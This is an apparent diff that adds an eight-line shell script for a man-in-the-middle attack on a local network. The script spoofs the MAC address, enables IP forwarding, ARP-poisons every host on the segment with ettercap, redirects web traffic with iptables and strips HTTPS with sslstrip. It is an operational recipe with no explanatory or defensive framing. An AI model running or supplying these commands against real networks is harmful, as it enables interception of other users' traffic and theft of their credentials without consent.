@@ -1,0 +1,8 @@
+ifconfig eth0 down
+macchanger --mac 00:22:33:44:55:66 eth0
+ifconfig eth0 up
+echo 1 > /proc/sys/net/ipv4/ip_forward
+nano /etc/etter.conf       => decomment iptables rules
+ettercap -Tql -eth0 -M arp:remote // //
+iptables -t nat -A PREROUTING -i eth0 -p tcp --destination-port 80 -j REDIRECT --to-port 10000
+sslstrip -a -k -f
